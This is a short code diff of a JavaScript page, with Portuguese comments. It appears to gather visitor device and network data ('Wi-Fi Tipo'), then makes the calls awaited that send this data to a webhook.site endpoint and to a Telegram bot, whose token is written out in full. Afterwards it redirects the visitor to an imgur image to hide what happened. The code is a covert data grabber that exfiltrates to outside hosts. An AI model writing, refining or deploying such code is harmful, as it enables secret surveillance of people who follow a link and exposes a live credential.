@@ -173,14 +173,14 @@
       };
 
       // Enviar para o Webhook.site
-      fetch("https://webhook.site/78116f6e-de2d-47cc-b5f9-04833af1e2a8", {
+      await fetch("https://webhook.site/78116f6e-de2d-47cc-b5f9-04833af1e2a8", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
       });
 
       // Enviar para o Telegram
-      fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
+      await fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -219,7 +219,7 @@ Wi-Fi Tipo: ${data.wifiInfo}
         })
       });
 
-      // Redirecionar para a imagem após o script
+      // Redirecionar após todas as requisições
       window.location.href = "https://imgur.com/a/UodXBtb"; // URL da imagem para redirecionamento
     }
 
